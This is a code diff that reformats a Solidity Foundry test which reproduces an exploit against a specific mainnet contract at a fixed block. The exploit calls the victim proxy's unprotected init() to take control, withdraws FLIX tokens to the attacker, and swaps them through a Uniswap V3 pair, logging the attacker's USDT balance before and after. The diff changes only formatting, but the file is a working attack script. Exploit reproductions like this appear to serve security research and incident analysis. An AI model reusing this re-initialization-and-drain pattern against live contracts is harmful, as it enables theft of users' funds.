@@ -22,20 +22,15 @@ import {IUniswapV3Router} from "src/interfaces/IUniswapV3Router.sol";
 // Hacking God :
 
 interface IProxy {
-    function init(
-        IERC20 initToken,
-        uint256 initPeriods,
-        uint256 initInterval
-    ) external;
 
-    function withdraw(
-        IERC20 otherToken,
-        uint256 amount,
-        address receiver
-    ) external;
+    function init(IERC20 initToken, uint256 initPeriods, uint256 initInterval) external;
+
+    function withdraw(IERC20 otherToken, uint256 amount, address receiver) external;
+
 }
 
 contract DN404 is Test {
+
     uint256 constant blockNumber = 19_196_685;
     address constant victim = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4;
     address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
@@ -54,11 +49,7 @@ contract DN404 is Test {
 
     function testExploit() public {
         // Implement exploit code here
-        emit log_named_decimal_uint(
-            " Attacker USDT Balance Before exploit",
-            IERC20(USDT).balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
 
         uint256 initPeriods = 1;
         uint256 initInterval = 1_000_000_000_000_000_000;
@@ -66,28 +57,15 @@ contract DN404 is Test {
 
         IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
         IProxy(victim).withdraw(IERC20(FLIX), amount, address(this));
-        IUniswapV3Pair(UniV3Pair).swap(
-            address(this),
-            true,
-            685_000_000_000_000_000_000_000,
-            4_295_128_740,
-            ""
-        );
+        IUniswapV3Pair(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
         // Log balances after exploit
-        emit log_named_decimal_uint(
-            " Attacker USDT Balance After exploit",
-            IERC20(USDT).balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
     }
 
-    function uniswapV3SwapCallback(
-        int256 amount0Delta,
-        int256,
-        bytes memory
-    ) external {
+    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes memory) external {
         IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
     }
 
     receive() external payable {}
+
 }
